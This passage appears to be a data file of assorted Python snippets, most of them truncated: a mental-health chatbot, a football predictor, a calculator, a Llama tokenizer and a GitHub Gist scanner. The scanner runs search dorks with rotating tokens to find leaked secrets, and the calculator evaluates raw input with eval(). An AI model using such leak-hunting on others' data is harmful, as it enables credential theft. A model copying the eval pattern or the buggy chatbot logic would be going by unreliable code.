user_input.lower():\r\n        return (\r\n            \"It sounds like you're experiencing depression. I'm here to help.\"\r\n            \"\\n- Would you like some mindfulness exercises?\"\r\n            \"\\n- Or would you like me to share resources on managing depression?\"\r\n        )\r\n    if \"I'm feeling overwhelmed with stress. Can you help?\" in user_input.lower():\r\n        return(\r\n            \"Absolutely! Let's start with some breathing exercises to help you relax.\"\r\n        )\r\n    if \"How do I manage stress at work?\" in user_input.lower():\r\n        return (\r\n            \"Try taking short breaks, prioritizing tasks, and setting clear boundaries between work and personal life.\"\r\n        )\r\n    if \"There are many strategies: grounding techniques, mindfulness exercises, and talking to a trusted person.\" in user_input.lower():\r\n        return (\r\n                 \"answer: \"+ \"There are many strategies: grounding techniques, mindfulness exercises, and talking to a trusted person.\"\r\n        )\r\n    if \"What are grounding techniques for anxiety\" in user_input.lower():\r\n        return (\r\n                \"answer\"+ \"Grounding techniques include the 5-4-3-2-1 method, which uses your senses to focus on the present moment.\"\r\n        )\r\n    if \"How do I know if I'm having an anxiety attack?\" in user_input.lower():\r\n        return (\r\n            \"Symptoms may include a racing heart, shortness of breath, and a sense of impending doom. Seek help if needed.\"\r\n        )\r\n    if \"What should I do during an anxiety attack?\" in user_input.lower():\r\n        return (\r\n            \"Try deep breathing, grounding techniques, and speaking to someone for support.\"\r\n        )\r\n    if \"How do I calm myself down during an anxiety attack?\" in user_input.lower():\r\n        return (\r\n            \"Focus on your breath, engage your senses, and practice positive self-talk.\"\r\n        )\r\n    if \"I'm feeling really low. Can you help?\" in user_input.lower():\r\n        return (\r\n            \"I'm here to support you. Would you like me to share resources on managing depression?\"\r\n        )\r\n    if \"What are some tips for managing depression?\" in user_input.lower():\r\n        return (\r\n            \"Stay connected with loved ones, engage in activities you enjoy, and consider seeking professional help.\"\r\n        )\r\n    if \"How can I lift my mood when I'm feeling down?\" in user_input.lower():\r\n        return (\r\n            \"Try exercise, listening to music, or engaging in hobbies you enjoy.\"\r\n        )\r\n    if \"What should I do if I'm feeling hopeless?\" in user_input.lower():\r\n        return (\r\n            \"It's important to reach out for professional help or talk to someone you trust.\"\r\n        )\r\n    if \"How do I practice self-care when i am  depressed?\" in user_input.lower():\r\n        return (\r\n            \"Start with small, manageable tasks like taking a shower or going for a walk.\"\r\n        )\r\n    if \"What are some mindfulness exercises I can try?\" in user_input.lower():\r\n        return (  \r\n        )\r\n   \r\n    if \"How can I manage racing thoughts?\" in user_input.lower():\r\n        return (\r\n             \"Try journaling, meditation, or speaking with a therapist.\"\r\n        )\r\n    if \"What can I do to relieve tension in my body?\" in user_input.lower():\r\n        return (\r\n            \"Try stretching, gentle exercise, or a warm bath.\"\r\n        )\r\n    if \"How are you today?\" in user_input.lower():\r\n        return (\r\n             \"Thank yo",
    "from sklearn.model_selection import train_test_split\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.preprocessing import LabelEncoder\nimport pandas as pd\nfrom api import getTestData, getpastfivematch\n\n\n\ndef put_in_list(data):\n    win = []\n    loss =[]\n    draw = []\n    for proba in data:\n        draw.append(proba[0])\n        loss.append(proba[1])\n        win.append(proba[2])\n\n    return win, loss, draw\n\ndef needData(data, data2):\n    team1OpponentName = []\n    team1MatchDate = []\n    team1MatchOutcome = []\n    team2OpponentName = []\n    team2MatchDate = []\n    team2MatchOutcome = []\n\n    for dat in data['team1_opponentname']:\n        team1OpponentName.append(dat)\n    for dat in data['team1_match_date']:\n        team1MatchDate.append(dat)\n    for dat in data['team1_Outcome']:\n        team1MatchOutcome.append(dat)\n    for dat in data2['team2_opponentname']:\n        team2OpponentName.append(dat)\n    for dat in data2['team2_match_date']:\n        team2MatchDate.append(dat)\n    for dat in data2['team2_Outcome']:\n        team2MatchOutcome.append(dat)\n\n    return team1OpponentName, team1MatchDate, team1MatchOutcome, team2OpponentName, team2MatchDate, team2MatchOutcome\n    \n\n\ndef predictionalgorithm(team1id, team2id):\n    outcome, event_date, team1, score, place, possession, dangerousattacks, accuracies, On_target, shotinsidebox, Corners, Attacks, team2, score2, place2, possession2, dangerousattacks2, accuracies2, On_target2, shotinsidebox2, Corners2, Attacks2 = getTestData(\n        teamid=team1id, teamid2=team2id)\n    outcomeB, event_dateB, team1B, scoreB, placeB, possessionB, dangerousattacksB, accuraciesB, On_targetB, shotinsideboxB, CornersB, AttacksB, team2B, score2B, place2B, possession2B, dangerousattacks2B, accuracies2B, On_target2B, shotinsidebox2B, Corners2B, Attacks2B, team2ids = getpastfivematch(\n        trainData=True)\n        \n    \n    testdata = pd.DataFrame({\n        'event_date': event_date,\n        'match_outcome': outcome,\n        'team1_id': team1,\n        'team1_possession': possession,\n        'team1_accuracy': accuracies,\n        'team1_shotinsidebox': shotinsidebox,\n        'team1_dangerousattacks': dangerousattacks,\n        'team1_place': place,\n        'team1_scores': score,\n        'team1_on_target': On_target,\n        'team1_corners': Corners,\n        'team1_attacks': Attacks,\n        'team2_id': team2,\n        'team2_possession': possession2,\n        'team2_accuracy': accuracies2,\n        'team2_shotinsidebox': shotinsidebox2,\n        'team2_dangerousattacks': dangerousattacks2,\n        'team2_place': place2,\n        'team2_scores': score2,\n        'team2_on_target': On_target2,\n        'team2_corners': Corners2,\n        'team2_attacks': Attacks2\n    })\n\n    traindata = pd.DataFrame({\n        'event_date': event_dateB,\n        'match_outcome': outcomeB,\n        'team1_id': team1B,\n        'team1_possession': possessionB,\n        'team1_accuracy': accuraciesB,\n        'team1_shotinsidebox': shotinsideboxB,\n        'team1_dangerousattacks': dangerousattacksB,\n        'team1_place': placeB,\n        'team1_scores': scoreB,\n        'team1_on_target': On_targetB,\n        'team1_corners': CornersB,\n        'team1_attacks': AttacksB,\n        'team2_id': team2B,\n        'team2_possession': possession2B,\n        'team2_accuracy': accuracies2B,\n        'team2_shotinsidebox': shotinsidebox2B,\n        'team2_dangerousattacks': dangerousattacks2B,\n        'team2_place': place2B,\n        'team2_scores': score2B,\n        'team2_on_target': On_target2B,\n        'team2_corners': Corners2B,\n        'team2_attacks': Attacks2B\n    })\n\n\n\n    traindata = traindata.fillna(traindata.mode().iloc[0])\n    traindata = traindata.sort_values(by='event_date', ascending=True)\n    testdata = testdata.sort_values(by='event_date', ascending=False)\n\n\n    features = traindata.drop(columns=['event_date', 'match_outcome', 'team2_id', 'team1_id'])\n    \n    #label encoding\n    labels = traindata['match_outcome']\n    encoded_label = LabelEncoder().fit_transform(labels)\n\n    # model trainig\n    X_train, _, Y_train, _ = train_test_split(features, encoded_label, test_size=0.1, random_state=50)\n    model = RandomForestClassifier(n_estimators=20, random_state=1)\n    model.fit(X=X_train, y=Y_train)\n\n    # testdata \n    X_test = testdata.head(n=1) \n    X_test = X_test.drop(columns=['event_date', 'match_outcome', 'team1_id', 'team2_id'])\n\n    #prediction\n    probability = model.predict_proba(X_test)\n\n    #needed data for displaying\n\n    teamData = testdata[['event_date', 'match_outcome', 'team1_id', 'team2_id']]\n    print(teamData)\n\n    return probability, teamData\n\n\n\n\n\n\n\n\n\n\ndef predictionalgorithm2(team1id, team2id):\n    outcome, event_date, team1, score, place, possession, dangerousattacks, accuracies, On_target, shotinsidebox, Corners, Attacks, team2, score2, place2, possession2, dangerousattacks2, accuracies2, On_target2, shotinsidebox2, Corners2, Attacks2, team2ids = getpastfivematch(\n        teamid=team1id)\n    ou",
    "import time\nfrom tqdm import tqdm\nfrom compiler.lib import *\n\nt = time.time()\n\ntokens = ['0', '1', '2']\npos = Register('pos', 2)\ntchaikovsky = Register('tchaikovsky', 1)\nanti_tchaikovsky = Register('anti_tchaikovsky', 1)\nzeros = Register('zeros', 1)\nones = Register('ones', 1)\nh0 = Register('h0', 1)\nh1 = Register('h1', 1)\nh2 = Register('h2', 1)\nh3 = Register('h3', 1)\nh4 = Register('h4', 1)\nh5 = Register('h5', 1)\nh6 = Register('h6', 1)\nh7 = Register('h7', 1)\nk0 = Register('k0', 1)\nk1 = Register('k1', 1)\nk2 = Register('k2', 1)\nk3 = Register('k3', 1)\nk4 = Register('k4', 1)\nk5 = Register('k5', 1)\nk6 = Register('k6', 1)\nk7 = Register('k7', 1)\nk8 = Register('k8', 1)\nk9 = Register('k9', 1)\nk10 = Register('k10', 1)\nk11 = Register('k11', 1)\nk12 = Register('k12', 1)\nk13 = Register('k13', 1)\nk14 = Register('k14', 1)\nk15 = Register('k15', 1)\nk16 = Register('k16', 1)\nk17 = Register('k17', 1)\nk18 = Register('k18', 1)\nk19 = Register('k19', 1)\nk20 = Register('k20', 1)\nk21 = Register('k21', 1)\nk22 = Register('k22', 1)\nk23 = Register('k23', 1)\nk24 = Register('k24', 1)\nk25 = Register('k25', 1)\nk26 = Register('k26', 1)\nk27 = Register('k27', 1)\nk28 = Register('k28', 1)\nk29 = Register('k29', 1)\nk30 = Register('k30', 1)\nk31 = Register('k31', 1)\nk32 = Register('k32', 1)\nk33 = Register('k33', 1)\nk34 = Register('k34', 1)\nk35 = Register('k35', 1)\nk36 = Register('k36', 1)\nk37 = Register('k37', 1)\nk38 = Register('k38', 1)\nk39 = Register('k39', 1)\nk40 = Register('k40', 1)\nk41 = Register('k41', 1)\nk42 = Register('k42', 1)\nk43 = Register('k43', 1)\nk44 = Register('k44', 1)\nk45 = Register('k45', 1)\nk46 = Register('k46', 1)\nk47 = Register('k47', 1)\nk48 = Register('k48', 1)\nk49 = Register('k49', 1)\nk50 = Register('k50', 1)\nk51 = Register('k51', 1)\nk52 = Register('k52', 1)\nk53 = Register('k53', 1)\nk54 = Register('k54', 1)\nk55 = Register('k55', 1)\nk56 = Register('k56', 1)\nk57 = Register('k57', 1)\nk58 = Register('k58', 1)\nk59 = Register('k59', 1)\nk60 = Register('k60', 1)\nk61 = Register('k61', 1)\nk62 = Register('k62', 1)\nk63 = Register('k63', 1)\nwc = Register('wc', 1)\nw0 = Register('w0', 1)\nw1 = Register('w1', 1)\nw2 = Register('w2', 1)\nw3 = Register('w3', 1)\nw4 = Register('w4', 1)\nw5 = Register('w5', 1)\nw6 = Register('w6', 1)\nw7 = Register('w7', 1)\nw8 = Register('w8', 1)\nw9 = Register('w9', 1)\nw10 = Register('w10', 1)\nw11 = Register('w11', 1)\nw12 = Register('w12', 1)\nw13 = Register('w13', 1)\nw14 = Register('w14', 1)\nw15 = Register('w15', 1)\ns0_a = Register('s0_a', 1)\ns0_b = Register('s0_b', 1)\ns0_c = Register('s0_c', 1)\ns0_d = Register('s0_d', 1)\ns0 = Register('s0', 1)\ns1_a = Register('s1_a', 1)\ns1_b = Register('s1_b', 1)\ns1_c = Register('s1_c', 1)\ns1_d = Register('s1_d', 1)\ns1 = Register('s1', 1)\nadd_step_1 = Register('add_step_1', 1)\nadd_step_2 = Register('add_step_2', 1)\nadd_step_3 = Register('add_step_3', 1)\nw16 = Register('w16', 1)\nw17 = Register('w17', 1)\nw18 = Register('w18', 1)\nw19 = Register('w19', 1)\nw20 = Register('w20', 1)\nw21 = Register('w21', 1)\nw22 = Register('w22', 1)\nw23 = Register('w23', 1)\nw24 = Register('w24', 1)\nw25 = Register('w25', 1)\nw26 = Register('w26', 1)\nw27 = Register('w27', 1)\nw28 = Register('w28', 1)\nw29 = Register('w29', 1)\nw30 = Register('w30', 1)\nw31 = Register('w31', 1)\nw32 = Register('w32', 1)\nw33 = Register('w33', 1)\nw34 = Register('w34', 1)\nw35 = Register('w35', 1)\nw36 = Register('w36', 1)\nw37 = Register('w37', 1)\nw38 = Register('w38', 1)\nw39 = Register('w39', 1)\nw40 = Register('w40', 1)\nw41 = Register('w41', 1)\nw42 = Register('w42', 1)\nw43 = Register('w43', 1)\nw44 = Register('w44', 1)\nw45 = Register('w45', 1)\nw46 = Register('w46', 1)\nw47 = Register('w47', 1)\nw48 = Register('w48', 1)\nw49 = Register('w49', 1)\nw50 = Register('w50', 1)\nw51 = Register('w51', 1)\nw52 = Register('w52', 1)\nw53 = Register('w53', 1)\nw54 = Register('w54', 1)\nw55 = Register('w55', 1)\nw56 = Register('w56', 1)\nw57 = Register('w57', 1)\nw58 = Register('w58', 1)\nw59 = Register('w59', 1)\nw60 = Register('w60', 1)\nw61 = Register('w61', 1)\nw62 = Register('w62', 1)\nw63 = Register('w63', 1)\na = Register('a', 1)\nb = Register('b', 1)\nc = Register('c', 1)\nd = Register('d', 1)\ne = Register('e', 1)\nf = Register('f', 1)\ng = Register('g', 1)\nh = Register('h', 1)\nch_a = Register('ch_a', 1)\nch_b = Register('ch_b', 1)\nch_c = Register('ch_c', 1)\nch = Register('ch', 1)\ntemp1 = Register('temp1', 1)\nmaj_a = Register('maj_a', 1)\nmaj_b = Register('maj_b', 1)\nmaj_c = Register('maj_c', 1)\nmaj_d = Register('maj_d', 1)\nmaj = Register('maj', 1)\ntemp2 = Register('temp2', 1)\nh0_final = Register('h0_final', 1)\nh1_final = Register('h1_final', 1)\nh2_final = Register('h2_final', 1)\nh3_final = Register('h3_final', 1)\nh4_final = Register('h4_final', 1)\nh5_final = Register('h5_final', 1)\nh6_final = Register('h6_final', 1)\nh7_final = Register('h7_final', 1)\n\nwork_registers = []\nfor i in range(30):\n    work_registers.append(Register(f'work_{i}', len(tokens)))\nembedding = EmbeddedState(tokens, [pos, tchaikovsky, anti_tchaikovsky, zeros, ones, h0, h1, h2, h3, h4, h5, h6, h7, k0, k1,",
    "from selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\nfrom os import getcwd\r\n\r\n# Setting up Chrome options with specific arguments\r\nchrome_options = webdriver.ChromeOptions()\r\nchrome_options.add_argument(\"--use-fake-ui-for-media-stream\")\r\nchrome_options.add_argument(\"--headless=new\")\r\n\r\n# Setting up the Chrome driver with WebDriverManager and options\r\ndriver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)\r\n\r\n# Creating the URL for the website using the current working directory\r\nwebsite = \"https://allorizenproject1.netlify.app/\"\r\n\r\n# Opening the website in the Chrome browser\r\ndriver.get(website)\r\n\r\nRecog_File = f\"{getcwd()}\\\\DATA\\\\INPUT_TEXT.txt\"\r\n\r\ndef listen():\r\n    print(\"The Advance Speech To Text is Processing..\")\r\n    try:\r\n        start_button = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, 'startButton')))\r\n        start_button.click()\r\n        print(\"Activated  Sir !\")\r\n        output_text = \"\"\r\n        is_second_click = False\r\n        while True:\r\n            output_element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'output')))\r\n            current_text = output_element.text.strip()\r\n            if \"Start Listening\" in start_button.text and is_second_click:\r\n                if output_text:\r\n                    is_second_click = False\r\n            elif \"Listening...\" in start_button.text:\r\n                is_second_click = True\r\n            if current_text != output_text:\r\n                output_text = current_text\r\n                with open(Recog_File, \"w\") as file:  \r\n                    file.write(output_text.lower())\r\n                    print(\"User:\", output_text)\r\n    except KeyboardInterrupt:\r\n        pass\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n\r\n",
    "# Standart libs import\nimport requests\nfrom bs4 import BeautifulSoup\nimport time\nfrom urllib.parse import unquote\n\n# Project lib's import\nfrom src.logger import logger, CLR\nfrom src import constants\nfrom src.glist import GlistObj\nfrom src import filters\n\nGIST_LINK_HTML_CLASS = 'link-overlay'\n\n\ndef _exc_catcher(func):\n    def wrapper(*args, **kwargs):\n        # res = func(*args, **kwargs)\n        # return res\n        try:\n            res = func(*args, **kwargs)\n        except Exception as exc:\n            logger.error(\n                f'Error during glist scan in {func.__name__}(): {exc}')\n        else:\n            return res\n\n    return wrapper\n\n\nclass GlistScan:\n    @classmethod\n    @_exc_catcher\n    def _glist_request(cls,\n                       dork,\n                       token,\n                       filter_: str = '',\n                       page: int = 1,\n                       ) -> str:\n        response_code = requests.get(\n            f'https://gist.github.com/search?o=desc&p={page}&q={dork}&s={filter_}',\n            headers={'Authorization': f'Token {token}'}, timeout=1000)\n        html = response_code.text\n        constants.dork_search_counter += 1\n        return html\n\n    @classmethod\n    def _links_exfiltr(cls, html: str, quantity: int):\n        soup = BeautifulSoup(html, 'html.parser')\n        a_elements = soup.find_all('a', class_=GIST_LINK_HTML_CLASS)\n        hrefs = tuple(elem['href']\n                      for i, elem in enumerate(a_elements)\n                      if i < quantity)\n        return hrefs\n\n    @classmethod\n    def _datetim_exfiltr(cls, html: str):\n        soup = BeautifulSoup(html, 'html.parser')\n        elem = soup.find('relative-time')\n        return elem.attrs['datetime'].split('T')[0]\n\n    @classmethod\n    def _scan(cls, url, dork):\n        SECRETS = filters.CheckRepo.run(url, dork, 2)\n        return SECRETS\n\n    @classmethod\n    @_exc_catcher\n    def run(cls, filter_: str = '', quantity: int = 15):\n        checked_list = {}\n        for organization in constants.dork_dict:\n            for i, dork in enumerate(constants.dork_dict[organization]):\n                if constants.dork_search_counter > constants.MAX_SEARCH_BEFORE_DUMP and len(constants.RESULT_MASS):\n                    filters.dumping_data()\n\n                constants.all_dork_search_counter += 1\n                logger.info(\n                    f'Current dork: {CLR[\"BOLD\"]}{unquote(dork)}{CLR[\"RESET\"]} {constants.all_dork_search_counter}/{constants.all_dork_counter}')\n                token = constants.token_list[i % len(constants.token_list)]\n                constants.dork_search_counter += 1\n                last_page_links = quantity % 10\n                pull_pages = (quantity // 10) + (last_page_links > 0)\n\n                for page in range(1, pull_pages + 1):\n                    time.sleep(1)\n                    html = cls._glist_request(dork, token, filter_, page)\n\n                    glists_links = cls._links_exfiltr(html, quantity)\n\n                    glists_links = filters.filter_url_by_DB(glists_links)\n                    if len(glists_links) == 0:\n                        break\n                    glists_links = filters.filter_url_by_repo(glists_links)\n                    if len(glists_links) == 0:\n                        break\n                    for _ in range(len(glists_links)):\n                        time.sleep(2)\n                        # Get date of gist creation\n                        if token != '-':\n                            header = {\n                                'Authorization': f'Token {token}'}\n                        else:\n                            time.sleep(2)\n                            header = {}\n                        get_date_gist_creation = requests.get(glists_links[_], headers=header)\n                        # Create Gist obj\n                        if glists_links[_] not in checked_list.keys():\n                            checked_list[glists_links[_]] = GlistObj.GlistObj(glists_links[_], dork,\n                                                                              cls._scan(glists_links[_], dork),\n                                                                              organization)\n                            checked_list[glists_links[_]].created_date = cls._datetim_exfiltr(\n                                get_date_gist_creation.text)\n                            checked_list[glists_links[_]].updated_date = cls._datetim_exfiltr(\n                                get_date_gist_creation.text)\n                            constants.RESULT_MASS['Glist_scan'][checked_list[glists_links[_]].repo_name] = checked_list[\n                                glists_links[_]]\n                        else:\n                            constants.RESULT_MASS['Glist_scan'][checked_list[glists_links[_]].repo_name] \\\n                                = checked_list[glists_links[_]]\n                        constants.quantity_obj_before_send += 1\n                        if (constants.quantity_o",
    "import customtkinter\nfrom tkinter import *\nfrom tkinter import messagebox\n\napp = customtkinter.CTk()\napp.title(\"Calculator\")\napp.geometry(\"250x270\")\napp.maxsize(250,270)\napp.minsize(250,270)\n\napp.config(bg=\"#000000\")\n\nfont1= (\"Arial\", 20, \"bold\")\n\ni=0\nequation=\"\"\n\ndef show(value):\n    global i\n    global equation\n    if(value==\"%\"):\n        value = \"/100\"\n    equation+=value\n    result_entry.insert(i,value)\n    i+=1\n\ndef clear():\n    global equation\n    result_entry.delete(0,END)\n    equation=\"\"\n\n\ndef calculate():\n    try:\n        global equation\n        result=\"\"\n        result=eval(equation)\n        clear()\n        result_entry.insert(0,result)\n    except:\n        messagebox.showerror(title=\"Error\", message=\"Please Enter a valid number.\")\n\nresult_entry = customtkinter.CTkEntry(app,placeholder_text=\"\",font=font1,width=230,fg_color=\"black\",border_color=\"white\", height=40)\nresult_entry.place(x=10,y=10)\n\n\n\nButton1 = customtkinter.CTkButton(app,command=clear,text=\"Clear\",font=font1,width=110,height=20,fg_color=\"#FF6619\",hover_color=\"#FF4219\")\nButton1.place(x=10,y=60)\n\nButton3 = customtkinter.CTkButton(app,command=lambda:show(\"%\"),text=\"%\",font=font1,width=50,height=20,fg_color=\"#0EF0FF\", border_color=\"black\", border_width=1.5, hover_color=\"#6BF6FF\", text_color=\"black\")\nButton3.place(x=130,y=60)\n\nButton4 = customtkinter.CTkButton(app,command=lambda:show(\"+\"),text=\"+\",font=font1,width=50,height=20,fg_color=\"#0EF0FF\", border_color=\"black\", border_width=1.5, hover_color=\"#6BF6FF\", text_color=\"black\")\nButton4.place(x=190,y=60)\n\n\n\nButton5 = customtkinter.CTkButton(app,command=lambda:show(\"7\"),text=\"7\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton5.place(x=10,y=100)\n\nButton6 = customtkinter.CTkButton(app,command=lambda:show(\"8\"),text=\"8\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton6.place(x=70,y=100)\n\nButton7 = customtkinter.CTkButton(app,command=lambda:show(\"9\"),text=\"9\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton7.place(x=130,y=100)\n\nButton8 = customtkinter.CTkButton(app,command=lambda:show(\"-\"),text=\"-\",font=font1,width=50,height=20,fg_color=\"#0EF0FF\", border_color=\"black\", border_width=1.5, hover_color=\"#6BF6FF\", text_color=\"black\")\nButton8.place(x=190,y=100)\n\n\n\nButton9 = customtkinter.CTkButton(app,command=lambda:show(\"4\"),text=\"4\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton9.place(x=10,y=140)\n\nButton10 = customtkinter.CTkButton(app,command=lambda:show(\"5\"),text=\"5\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton10.place(x=70,y=140)\n\nButton11 = customtkinter.CTkButton(app,command=lambda:show(\"6\"),text=\"6\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton11.place(x=130,y=140)\n\nButton12 = customtkinter.CTkButton(app,command=lambda:show(\"*\"),text=\"x\",font=font1,width=50,height=20,fg_color=\"#0EF0FF\", border_color=\"black\", border_width=1.5, hover_color=\"#6BF6FF\", text_color=\"black\")\nButton12.place(x=190,y=140)\n\n\n\nButton13 = customtkinter.CTkButton(app,command=lambda:show(\"1\"),text=\"1\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton13.place(x=10,y=180)\n\nButton14 = customtkinter.CTkButton(app,command=lambda:show(\"2\"),text=\"2\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton14.place(x=70,y=180)\n\nButton15 = customtkinter.CTkButton(app,command=lambda:show(\"3\"),text=\"3\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton15.place(x=130,y=180)\n\nButton16 = customtkinter.CTkButton(app,command=lambda:show(\"/\"),text=\"/\",font=font1,width=50,height=20,fg_color=\"#0EF0FF\", border_color=\"black\", border_width=1.5, hover_color=\"#6BF6FF\", text_color=\"black\")\nButton16.place(x=190,y=180)\n\n\n\nButton13 = customtkinter.CTkButton(app,command=lambda:show(\".\"),text=\".\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton13.place(x=10,y=220)\n\nButton14 = customtkinter.CTkButton(app,command=lambda:show(\"0\"),text=\"0\",font=font1,width=50,height=20,fg_color=\"#CDCDCD\", border_color=\"black\", border_width=1.5, hover_color=\"#DEDEDE\", text_color=\"black\")\nButton14.place(x=70,y=220)\n\nButton15 = customtkinter.CTkButton(app,command=calculate,text=\"Enter\",font=font1,width=110,height=20,fg_color=\"#0DFF68\", border_color=\"black\", border_width=1.5, hover_color=\"",
    "# Copyright (c) Meta Platforms, Inc. and affiliates.\n# This software may be used and distributed according to the terms of the Llama 2 Community License Agreement.\n\nimport os\nfrom logging import getLogger\nfrom typing import List\n\nfrom sentencepiece import SentencePieceProcessor\n\n\nlogger = getLogger()\n\n\nclass Tokenizer:\n    \"\"\"tokenizing and encoding/decoding text using SentencePiece.\"\"\"\n    def __init__(self, model_path: str):\n        \"\"\"\n        Initializes the Tokenizer with a SentencePiece model.\n\n        Args:\n            model_path (str): The path to the SentencePiece model file.\n        \"\"\"\n        # reload tokenizer\n        assert os.path.isfile(model_path), model_path\n        self.sp_model = SentencePieceProcessor(model_file=model_path)\n        logger.info(f\"Reloaded SentencePiece model from {model_path}\")\n\n        # BOS / EOS token IDs\n        self.n_words: int = self.sp_model.vocab_size()\n        self.bos_id: int = self.sp_model.bos_id()\n        self.eos_id: int = self.sp_model.eos_id()\n        self.pad_id: int = self.sp_model.pad_id()\n        logger.info(\n            f\"#words: {self.n_words} - BOS ID: {self.bos_id} - EOS ID: {self.eos_id}\"\n        )\n        assert self.sp_model.vocab_size() == self.sp_model.get_piece_size()\n\n    def encode(self, s: str, bos: bool, eos: bool) -> List[int]:\n        \"\"\"\n        Encodes a string into a list of token IDs.\n\n        Args:\n            s (str): The input string to be encoded.\n            bos (bool): Whether to prepend the beginning-of-sequence token.\n            eos (bool): Whether to append the end-of-sequence token.\n\n        Returns:\n            List[int]: A list of token IDs.\n        \"\"\"\n        assert type(s) is str\n        t = self.sp_model.encode(s)\n        if bos:\n            t = [self.bos_id] + t\n        if eos:\n            t = t + [self.eos_id]\n        return t\n\n    def decode(self, t: List[int]) -> str:\n        \"\"\"\n        Decodes a list of token IDs into a string.\n\n        Args:\n            t (List[int]): The list of token IDs to be decoded.\n\n        Returns:\n            str: The decoded string.\n        \"\"\"\n        return self.sp_model.decode(t)\n",
    "sufix = {\n\n        2 : \"B\",\n        8 : \"O\",\n        10 : \"D\",\n        16 : \"H\"\n}\n\n# creating a list to handle with hexa decimal representation\nsigns = []\nfor i in range(0,10):\n    signs.append(str(i))\nsigns = signs + [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\"]\n\ndef decimal_to(dec,num_system):\n    \n    signs = []\n    for i in range(0,10):\n        signs.append(str(i))\n    signs = signs + [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\"]\n\n    rem = 0\n    value = \"\"\n    while dec != 0:\n        rem = dec % num_system\n        dec = dec // num_system\n        value = signs[rem] + value\n    print(f\"{value}-{sufix[num_system]}\")\n\ndef to_decimal(num,num_system):\n    err = 0\n    # Seperation induvidual digits in the number to conversion\n    values = list(reversed((\" \".join(str(num))).split(\" \"))) # here we are adding a space between all letters\n    # values = values.split(\" \") # spliting in the space\n    # values = list(reversed(values))\n    \n    # Conversion \n    k = 0\n    dec_value = 0\n    while len(values) > k:\n        # chech if the number is valid\n        if num_system == 16:\n            if (str(values[k]) not in signs):\n                print(f\"Invalid number! {values[k]} cannto be used in {num_system} based number system!\")\n                err = 1\n                \n        else:\n            if (int(values[k]) >= num_system):\n                print(f\"Invalid number! {values[k]} cannto be used in {num_system} based number system!\")\n        n = 0\n        while n < 16:\n            if str(values[k]) == str(signs[n]):\n                dec_value += (num_system**k)*n\n            n += 1\n        k += 1\n    if err == 0:\n        print(f\"{dec_value}-D\") \n\n# Octal and hexadecimal to binary conversion\n\ndef octal_hex_to_binary(num,num_system):\n    bin_value = \"\" # this is the place where the answer goes\n    err = 0 # To find if the number user entered is an octal/hexa number and record the output \n    \n    # main loop to go through the digits\n    for i in str(num):\n        value_hold = \"\"\n        m = 0 # to detect the equevelent value for hexa decimal signs\n        while i != signs[m]:\n            m += 1\n        k = 0 # to maintain 3-bit for octal and 4-bit for hexa\n        # Checking if the number is an octal number \n        if num_system == 8:\n            \n            k = 3\n            if m > 7:\n                err = 1\n                break\n        elif num_system == 16:\n            k = 4\n            \n        \n        # converting the digit to binary \n        while m > 0:\n            value_hold = str(m % 2) + value_hold\n            m = m // 2\n        #  making sure the octal digit is converted to 3-bit binary equevelant\n        while len(value_hold ) < k:\n            value_hold = \"0\" + value_hold\n        # updating the final answer\n        bin_value = bin_value + value_hold\n    if err == 0:\n        print(bin_value)\n\n# Binary to Octal and Hexadecimal Conversion\n\ndef binary_to_octal_hex(num,num_system):\n    err = 0\n    k = 1\n    # setting up based on number system we have to convert\n    if num_system == 8:\n        k = 2\n    elif num_system == 16:\n        k = 3\n    else:\n        err = 1\n    answer = \"\"\n    count = 0\n    num_hold = 0\n\n    # Looping through digits from back to front\n    for i in reversed(str(num)):\n        # Finding the value of binary digit\n        num_hold += (int(i) * 2 ** count)\n        # breaking by 3 or 4 digits respactively for octal or hexadecimal\n        if count == k:\n            answer = signs[num_hold] + answer\n            count = 0\n            num_hold = 0\n        else:\n            count += 1\n    # making sure to add the last digit if num does not \n    # have 3 or 4 bit in the end respectivel for octal and hexadecimal\n    if len(str(num)) % (k+1) != 0:\n        answer = signs[num_hold] + answer\n    if err == 1:\n        print(\"Invalid file type for function binary_to_octal_hex\") \n    else:\n        print(answer)\n    # print(answer)\n\n# to_decimal(\"143\",8)\n# decimal_to(234,10)\n# octal_hex_to_binary(\"A2\",16)\n# octal_hex_to_binary()\nbinary_to_octal_hex(10111110010,16)\n",
